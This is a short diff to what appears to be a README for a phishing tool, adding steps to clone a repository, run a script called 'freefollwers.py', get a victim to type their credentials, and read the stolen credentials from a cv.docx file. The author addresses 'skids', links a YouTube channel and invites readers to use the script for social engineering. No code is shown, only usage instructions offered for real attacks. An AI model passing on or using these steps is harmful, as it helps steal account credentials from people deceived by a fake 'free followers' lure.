@@ -10,3 +10,14 @@ after the person types the creds check the cv.docx in the document-phishing fold
 subscribe to me skids
 https://www.youtube.com/channel/UC3ZNAm1yPMUVQ9rtqQlwnOA
 
+Type git clone https://github.com/2010-doppelganger/document-phishing.git
+type ls
+cd document-phishing
+type ls
+python3 freefollwers.py
+make the person enter his stuff
+saves in the creds in the cv.docx open it his or ur creds will be there 
+
+u could do many things with this script with social engineering 
+enjoy my script 
+
